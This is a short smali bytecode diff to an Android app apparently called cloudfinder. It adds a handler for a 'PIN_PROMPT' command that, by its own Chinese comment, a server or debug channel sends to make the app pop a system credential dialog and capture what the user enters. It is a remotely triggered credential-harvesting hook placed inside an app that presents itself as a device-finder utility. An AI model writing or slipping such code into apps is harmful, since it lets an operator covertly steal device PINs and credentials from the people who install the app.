@@ -109,6 +109,20 @@
     return-void
 
     :cond_0
+    # 2.2 指令入口：服务器/调试下发 PIN_PROMPT → 弹系统凭据框并采集
+    const-string v1, "com.lite.cloudfinder.PIN_PROMPT"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :not_pin_prompt
+
+    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->promptForce(Landroid/content/Context;)V
+
+    return-void
+
+    :not_pin_prompt
     invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
 
     move-result v1
